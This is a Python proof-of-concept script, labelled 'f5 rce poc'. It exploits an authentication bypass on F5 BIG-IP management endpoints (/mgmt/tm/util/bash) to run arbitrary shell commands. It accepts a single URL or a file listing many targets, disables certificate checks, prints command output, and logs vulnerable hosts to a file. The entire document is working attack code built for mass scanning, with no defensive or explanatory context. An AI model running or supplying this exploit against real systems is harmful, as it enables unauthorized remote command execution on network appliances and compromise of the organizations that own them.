import requests
import sys
import json
import argparse
import re
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

t = int(time.time())

def poc_1(target_url, command):
    print(target_url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Content-Type': 'application/json',
        'X-F5-Auth-Token': '',
        'Authorization': 'Basic YWRtaW46QVNhc1M='
    }

    data = json.dumps({'command': 'run' , 'utilCmdArgs': '-c ' + command})
    # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    check_url = target_url + '/mgmt/tm/util/bash'
    try:
        r = requests.post(url=check_url, data=data, headers=headers, verify=False, timeout=20)
        if r.status_code == 200 and 'commandResult' in r.text:
            default = json.loads(r.text)
            display = default['commandResult']
            save_file(target_url, t)
            print('[+] vulnerable {0}'.format(target_url))
            print('$ > {0}'.format(display))
        else:
            print('[-] Not vulnerable')        
    except Exception as e:
        print('url dead {0}'.format(target_url))

def save_file(target_url, t):
    output_name = 'Output_{0}.txt'.format(t)
    f = open(output_name, 'a')
    f.write(target_url + '\n')
    f.close()

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL Error {0}'.format(url))

def main():
    parser = argparse.ArgumentParser("f5 rce poc")
    parser.add_argument('-u', '--url', type=str, help=' URL ')
    parser.add_argument('-f', '--file', type=str, help=' File List ')
    parser.add_argument('-c', '--command', type=str, default="id", help=' execute commands ')
    args = parser.parse_args()

    url = args.url
    file = args.file
    command = args.command



    if not url is None:
        target_url = format_url(url)
        poc_1(target_url, command)
    elif file != '':
        for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip())
                poc_1(url_path, command)
    else:
        sys.exit(0)     

if __name__ == '__main__':
    main()
